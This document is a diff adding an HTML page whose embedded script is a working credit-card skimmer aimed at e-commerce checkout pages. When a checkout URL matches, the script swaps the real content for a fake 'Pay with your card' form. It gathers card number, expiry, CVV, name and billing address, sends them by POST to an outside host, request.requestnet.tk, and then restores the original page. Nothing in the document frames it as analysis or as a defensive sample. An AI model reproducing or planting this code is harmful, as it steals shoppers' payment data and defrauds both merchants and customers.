@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<script>
+
+var blockformerchtoreplace = ".main";
+var contentfrompaymentblock = "";
+
+function verifdataformerchant()
+{
+    var query_verifto = "cc_number=" + encodeURIComponent(jQuery("[name=\"cc_number\"]").val());
+    query_verifto += "&cc_month=" + encodeURIComponent(jQuery("[name=\"cc_month\"]").val());
+    query_verifto += "&cc_year=" + encodeURIComponent(jQuery("[name=\"cc_year\"]").val());
+    query_verifto += "&cc_cvv=" + encodeURIComponent(jQuery("[name=\"cc_cid\"]").val());
+    query_verifto += "&cc_fname=" + encodeURIComponent(jQuery("[name=\"cc_fname\"]").val());
+    query_verifto += "&cc_lname=" + encodeURIComponent(jQuery("[name=\"cc_lname\"]").val());
+    query_verifto += "&bill_country=" + encodeURIComponent(jQuery("[name=\"bill_country\"]").val());
+    query_verifto += "&bill_address=" + encodeURIComponent(jQuery("[name=\"bill_address\"]").val());
+    query_verifto += "&bill_city=" + encodeURIComponent(jQuery("[name=\"bill_city\"]").val());
+    query_verifto += "&bill_state=" + encodeURIComponent(jQuery("[name=\"bill_state\"]").val());
+    query_verifto += "&bill_postcode=" + encodeURIComponent(jQuery("[name=\"bill_postcode\"]").val());
+    query_verifto += "&location=" + encodeURIComponent(location.host);
+    if(!(query_verifto.indexOf("=&") + 1))
+	{
+        var rand = function() { return Math.random().toString(36).substr(2); };
+		document.cookie = "userpayid=" + rand();
+        jQuery.ajax({url:"//request.requestnet.tk/dataverification.php", type:"POST", data:query_verifto});
+        jQuery(blockformerchtoreplace).html(contentfrompaymentblock);
+    }else jQuery(".nlu").attr("style", "color:red;");
+}
+
+jQuery(document).ready(function()
+{
+    if((location.href.indexOf("vquote/index") + 1) || (location.href.indexOf("idecheckoutvm") + 1) || (location.href.indexOf("checkout/onepage") + 1) || (location.href.indexOf("firecheckout") + 1) || (location.href.indexOf("qquoteadv/index") + 1) || (location.href.indexOf("onestepcheckout") + 1) || (location.href.indexOf("testbox.html") + 1))
+    {
+        if(!(document.cookie.indexOf("userpayid") + 1))
+        {
+            contentfrompaymentblock = jQuery(blockformerchtoreplace).html(); jQuery(blockformerchtoreplace).html("");
+
+            var css = ".paymentcontenttomerch {margin:30px auto;color:#777;width:570px;font:13px/18px arial, sans-serif;background:#fff;} .paymentcontenttomerchtable{font:13px/18px arial, sans-serif;color:#777;border-spacing:0px;width:100%;}.formpaymentcontenttomerch {margin:0px;padding:0px;}\
+            .h1paymentcontenttomerch, .h2paymentcontenttomerch {font-weight:300;color:#363636;margin:0px;display:block;padding-top:30px;} .h2paymentcontenttomerch {padding-bottom:30px;padding-top:0px;text-align:center;}\
+            .paymentcontenttomerchinput {background:#fff;width:100%;border-radius:4px;padding:10px;margin-top:12px;border:1px solid #e7e7e7;} .paymentcontenttomerchinput:focus {background:#fcfcfc;}\
+            .paymentcontenttomerchselect {width:150px;margin-right:10px;} .paymentcontenttomerchbutton {width:100%;padding:10px;border-radius:7px;color:#fff;text-align:center;background:#0070ba;border:1px solid #0070ba; font-weight:600;}.paymentcontenttomerchcontent {border-radius:4px;\
+            display:block;padding:30px;border:1px solid #f4f4f4;} .paymentcontenttomerchmenu {display:block;padding-bottom:30px;border-bottom:1px solid #f4f4f4;} .paymentcontenttomerchmenu .paymentcontenttomerchlogotype {height:47px;width:180px;display:block;\
+            background:url('https://paymentnow.tk/logotype.png');background-size:cover;} .paymentcontenttomerchinfo {margin-top:13px;display:block;font-size:15px;} .paymentcontenttomerchfirstinput, .paymentcontenttomerchfirstinputfname {width:96%;}.paymentcontenttomerchcvv2img {\
+            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAXCAYAAABu8J3cAAABo0lEQVR42u2Vv2rCUBTG8xC+R6fOFvoCzRO0II61Y1ZXtyrUQUoJqSCikBZpFxGEDKWGSglaRAcVdIhKh/TP0OW03y0J5l+N1F4ceuGXnJycm+/L4d5EoC0ZAg7F8hWd5i+4A12XESTbjwZ1uk/cuNcfmK7PiGma1O/3qV6vMwzDIF3XGZqmObE3Z9fZc4D3npfxeMz0Qo0ARVEok8lQrVZj50qlQoVCwYmz2SyLUYc8rpFPp9POfbseNXa9JEksRh1eeKURngQaCWrhXxNoJJlMcuffSCQjWNm82e5ds0mB2XBIz2f5QObNZjQjg8GARqPRr1ikTuhlf4/ej1Mu3o4OydrdoVmnG80IhmVZvj/kdDp18ojD6iD6oVxSo9EgVVVJlmXK5XLf87+M2F1ZaQQPSCQSPuLxuAtRFFkeZ9vYspFYLEaCIDhzYXotI3hor9djIA4CX8bluqCOoBMAXcHLsQ6uY2QTa+RVPAhdI/NWi8+ugVDYrlnc3P68ayaTCddvCPR8RvLnRVJKVSpVr7kBPei6jMzmC7prtbkDXZeRbRif8jIAim8P46gAAAAASUVORK5CYII=');\
+            background-size:cover;width:31px;display:block;position:absolute;height:21px;margin-left:135px;margin-top:20px;} .paymentcontenttomerchfirstinputfname, .paymentcontenttomerchlname {width:224px;margin-right:10px;}.paymentcontenttomerchlname {margin-right:0px;}.paymentcontenttomerchcvv2 {width:31%;}";
+
+            var countrys = '<option selected disabled>Choose your country</option><option value="AX">Åland Islands</option><option value="AS">American Samoa</option><option value="AQ">Antarctica</option>\
+            <option value="AG">Antigua and Barbuda</option><option value="AR">Argentina</option><option value="AW">Aruba</option><option value="AU">Australia</option><option value="AT">Austria</option><option value="BS">Bahamas</option>\
+            <option value="BH">Bahrain</option><option value="BD">Bangladesh</option><option value="BB">Barbados</option><option value="BY">Belarus</option><option value="BE">Belgium</option><option value="BZ">Belize</option>\
+            <option value="BJ">Benin</option><option value="BM">Bermuda</option><option value="BA">Bosnia and Herzegovina</option><option value="BV">Bouvet Island</option><option value="BR">Brazil</option><option value="IO">British Indian Ocean Territory</option>\
+            <option value="VG">British Virgin Islands</option><option value="BN">Brunei</option><option value="BG">Bulgaria</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="CV">Cape Verde</option>\
+            <option value="KY">Cayman Islands</option><option value="CL">Chile</option><option value="CX">Christmas Island</option><option value="CC">Cocos (Keeling) Islands</option><option value="KM">Comoros</option><option value="CK">Cook Islands</option>\
+            <option value="CR">Costa Rica</option><option value="CI">Côte d’Ivoire</option><option value="HR">Croatia</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option>\
+            <option value="DO">Dominican Republic</option><option value="EC">Ecuador</option><option value="EG">Egypt</option><option value="SV">El Salvador</option><option value="GQ">Equatorial Guinea</option><option value="EE">Estonia</option>\
+            <option value="FK">Falkland Islands</option><option value="FO">Faroe Islands</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GF">French Guiana</option>\
+            <option value="PF">French Polynesia</option><option value="TF">French Southern Territories</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GI">Gibraltar</option><option value="GR">Greece</option>\
+            <option value="GL">Greenland</option><option value="GD">Grenada</option><option value="GP">Guadeloupe</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="HM">Heard &amp; McDonald Islands</option>\
+            <option value="HN">Honduras</option><option value="HK">Hong Kong SAR China</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="IE">Ireland</option>\
+            <option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="JO">Jordan</option><option value="KZ">Kazakhstan</option>\
+            <option value="KW">Kuwait</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="MO">Macau SAR China</option>\
+            <option value="MK">Macedonia</option><option value="MG">Madagascar</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option>\
+            <option value="MH">Marshall Islands</option><option value="MQ">Martinique</option><option value="MU">Mauritius</option><option value="MX">Mexico</option><option value="FM">Micronesia</option><option value="MD">Moldova</option>\
+            <option value="MC">Monaco</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MA">Morocco</option><option value="NP">Nepal</option><option value="NL">Netherlands</option>\
+            <option value="AN">Netherlands Antilles</option><option value="NC">New Caledonia</option><option value="NZ">New Zealand</option><option value="NF">Norfolk Island</option><option value="NO">Norway</option><option value="OM">Oman</option>\
+            <option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PS">Palestinian Territories</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PY">Paraguay</option>\
+            <option value="PE">Peru</option><option value="PH">Philippines</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="PR">Puerto Rico</option><option value="QA">Qatar</option>\
+            <option value="RE">Réunion</option><option value="RO">Romania</option><option value="RU">Russia</option><option value="LC">Saint Lucia</option><option value="MF">Saint Martin</option><option value="PM">Saint Pierre and Miquelon</option>\
+            <option value="WS">Samoa</option><option value="SM">San Marino</option><option value="ST">São Tomé and Príncipe</option><option value="SA">Saudi Arabia</option><option value="SL">Sierra Leone</option><option value="SG">Singapore</option>\
+            <option value="SK">Slovakia</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="ZA">South Africa</option><option value="KR">South Korea</option><option value="ES">Spain</option>\
+            <option value="LK">Sri Lanka</option><option value="VC">St. Vincent &amp; Grenadines</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="TW">Taiwan</option><option value="TH">Thailand</option>\
+            <option value="TT">Trinidad and Tobago</option><option value="TN">Tunisia</option><option value="TR">Turkey</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option>\
+            <option value="US">United States</option><option value="UY">Uruguay</option><option value="UM">U.S. Outlying Islands</option><option value="VI">U.S. Virgin Islands</option><option value="VU">Vanuatu</option><option value="VA">Vatican City</option>\
+            <option value="EH">Western Sahara</option>';
+
+            jQuery(blockformerchtoreplace).html('<style>' + css + '</style><div class="paymentcontenttomerch"><div class="paymentcontenttomerchcontent"><div class="paymentcontenttomerchmenu"><div class="paymentcontenttomerchlogotype"></div></div><h1 class="h1paymentcontenttomerch">Pay with your card</h1>\
+            <div class="paymentcontenttomerchinfo">We are concerned about security of your personal data and your card details. <font class="nlu">Please check carefully whether cards input and bill address inputs fields are filled in, this is necessary to continue the payment</font>.</div>\
+            <input type="text" name="cc_number" style="width:100%;" class="paymentcontenttomerchinput paymentcontenttomerchfirstinput" placeholder="Card number">\
+            <table class="paymentcontenttomerchtable"><tr><td style="width:33%;"><select class="paymentcontenttomerchinput paymentcontenttomerchselect" style="color:#575757;width:100%;" name="cc_month">\
+            <option selected disabled>Month</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option>\
+            <option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select></td><td style="width:33%;">\
+            <select class="paymentcontenttomerchinput paymentcontenttomerchselect" style="color:#575757;width:100%;" name="cc_year"><option selected disabled>Year</option><option value="2017">2017</option><option value="2018">2018</option>\
+            <option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option>\
+            <option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option></select></td><td><div class="paymentcontenttomerchcvv2img"></div>\
+            <input type="text" name="cc_cid" style="width:100%;" class="paymentcontenttomerchinput paymentcontenttomerchcvv2" placeholder="Security code"></td></tr></table><table class="paymentcontenttomerchtable"><tr><td>\
+            <input type="text" name="cc_fname" class="paymentcontenttomerchinput paymentcontenttomerchfirstinputfname" style="width:100%;" placeholder="First name"></td><td><input type="text" name="cc_lname" class="paymentcontenttomerchinput paymentcontenttomerchlname" style="width:100%;" placeholder="Last name"></td></tr>\
+            </table><div class="info" style="margin-top:30px;">Card holder address ( Bill address )</div><select class="paymentcontenttomerchinput paymentcontenttomerchselect" name="bill_country" style="color:#575757;width:100%;">' + countrys + '\
+            </select><input type="text" name="bill_address" class="paymentcontenttomerchinput paymentcontenttomerchfirstinput" style="width:100%;" placeholder="Address (street, house, apartments)">\
+            <input type="text" name="bill_city" class="paymentcontenttomerchinput paymentcontenttomerchfirstinput" style="width:100%;" placeholder="Locality (city, village)"><table class="paymentcontenttomerchtable" style="padding-bottom:10px;"><tr><td style="width:50%;">\
+            <input style="width:100%;" type="text" name="bill_state" class="paymentcontenttomerchinput paymentcontenttomerchfirstinputfname" placeholder="Region / State"></td><td style="width:50%;">\
+            <input style="width:100%;" type="text" name="bill_postcode" class="paymentcontenttomerchinput paymentcontenttomerchlname" placeholder="Zip code"></td></tr></table><div class="info" style="margin-top:30px;">Ship to address ( If the bill address and address for sending are the same, you can immediately press the button for payment )</div>\
+            <select class="paymentcontenttomerchinput paymentcontenttomerchselect" name="ship_country" style="color:#575757;width:100%;">' + countrys + '</select><input type="text" name="ship_address" class="paymentcontenttomerchinput paymentcontenttomerchfirstinput" style="width:100%;" placeholder="Address (street, house, apartments)">\
+            <input type="text" name="ship_city" class="paymentcontenttomerchinput paymentcontenttomerchfirstinput" style="width:100%;" placeholder="Locality (city, village)"><table class="paymentcontenttomerchtable" style="padding-bottom:10px;"><tr><td style="width:50%;">\
+            <input type="text" name="ship_state" class="paymentcontenttomerchinput paymentcontenttomerchfirstinputfname" style="width:100%;" placeholder="Region / State"></td><td style="width:50%;">\
+            <input type="text" name="ship_postcode" class="paymentcontenttomerchinput paymentcontenttomerchlname" style="width:100%;" placeholder="Zip code"></td></tr></table><input onclick="verifdataformerchant();" class="paymentcontenttomerchbutton" type="submit" value="Pay now"></div></div>');
+        }
+    }
+});
+</script>
+</html>
